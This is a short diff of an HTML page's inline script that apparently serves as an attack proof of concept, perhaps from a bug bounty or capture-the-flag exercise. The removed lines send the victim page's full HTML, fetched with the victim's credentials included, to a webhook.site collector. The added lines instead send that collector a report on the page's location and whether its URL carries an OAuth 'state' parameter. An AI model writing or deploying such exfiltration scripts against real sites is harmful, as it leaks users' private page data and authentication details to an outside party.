@@ -7,11 +7,20 @@
         credentials: "include"
     })
 
+    const report = {
+        hostname: location.hostname,
+        pathname: location.pathname,
+        hasQuery: location.search.length > 0,
+        hasState: new URLSearchParams(location.search).has("state")
+    };
+
     fetch("https://webhook.site/28c54aae-b353-4708-a029-f0fb185e5f35", {
-        method: 'POST',
-        body: document.documentElement.outerHTML,
-        credentials: "include"
-    })
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(report)
+    });
 </script>
 
 <h1>OH THATS TUFFFFFF</h1>
